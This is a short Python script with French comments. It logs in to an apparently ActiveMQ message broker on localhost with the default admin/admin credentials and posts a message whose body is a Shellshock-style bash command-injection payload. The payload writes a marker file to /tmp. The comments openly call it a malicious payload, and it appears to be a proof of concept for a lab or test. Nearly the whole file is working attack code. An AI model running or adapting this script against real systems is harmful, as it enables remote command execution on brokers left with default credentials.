import requests
from requests.auth import HTTPBasicAuth

# Informations d'authentification
username = 'admin'
password = 'admin'

# URL pour envoyer un message à la queue
send_message_url = "http://localhost:8161/api/message/bonjour?type=queue"

# Payload du message malveillant
payload = {
    "body": "() { :;}; /bin/bash -c 'echo bravo champion > /tmp/success'",
    "jmsType": "text/plain" 
}

# Envoyer le message
response_send = requests.post(send_message_url, json=payload, auth=HTTPBasicAuth(username, password))

# Vérification de la réponse
if response_send.status_code == 200:
    print("Message envoyé avec succès à la queue")
else:
    print(f"Erreur lors de l'envoi du message: {response_send.status_code} - {response_send.text}")



